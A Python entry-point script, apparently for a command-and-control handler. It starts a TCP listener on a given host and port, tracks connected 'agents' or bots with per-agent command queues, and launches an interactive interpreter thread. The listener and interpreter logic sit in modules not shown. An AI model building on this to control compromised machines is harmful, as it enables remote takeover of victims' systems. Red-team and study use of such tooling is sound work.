#!/usr/bin/python3

# Main imports
import socket
import sys
import os
import signal
import threading
import queue
import time

# Project imports
from interpreter import Interpreter
from listener_tcp import Listener_TCP


agentList = []                  # Stores client_address[] info (IP, Port): IP is stored in string format, port is not

                                # [Handler-ID]-[client_address]-[ IP ]
                                #            |                L-[Port]
                                #            L-[CMD_Queue]

listeners = []                  # Handles all listeneing threads (TCP, HTTP, DNS, etc...)
                                # Ensuring that information can be passed between them and allowing for easier management

responseQueue = queue.Queue()   # Single queue for handling all responses sent from each respective listeners
                                # Idea: Add identification to each message (like a header) to ensure that the 
                                # message allocates itself to the server output correctly

# -------------------------------------------------------------------------------------------

# TODO
#      - Test Kill function
#      - Reimplement queues





def main():

    # batchList = []              # List for systems that are being interacted with in BatchMode
    # allConnections = []        # Stores all BotHandler instances
    # aliveConnections = []       # Stores all currently alive BotHandler sessions
    # deadConnections = []        # Records the dead-instance's information
                                # This may be an odd thing to implement. 
                                # Do we simply want to store the IP address + Port + ID?

    if (len(sys.argv) < 3):
        print(f"[* Interpreter-Msg] Usage:\n  [+] python3 {sys.argv[0]} <LHOST> <LPORT>\n  [+] Eg.: python3 {sys.argv[0]} 0.0.0.0 1337\n")
    else:
        try:
            lhost = sys.argv[1]
            lport = int(sys.argv[2])

            TCP_Thread = Listener_TCP(lhost, lport, agentList, responseQueue)
            TCP_Thread.start()

            InterpreterThread = Interpreter(agentList, listeners, responseQueue)          # Handles interface, queue is for commands
            InterpreterThread.start()
        except Exception as ex:
            print(f"[* Interpreter-Msg] Unable to establish the Handler. Error: {str(ex)}\n")

if __name__ == '__main__':
    main()
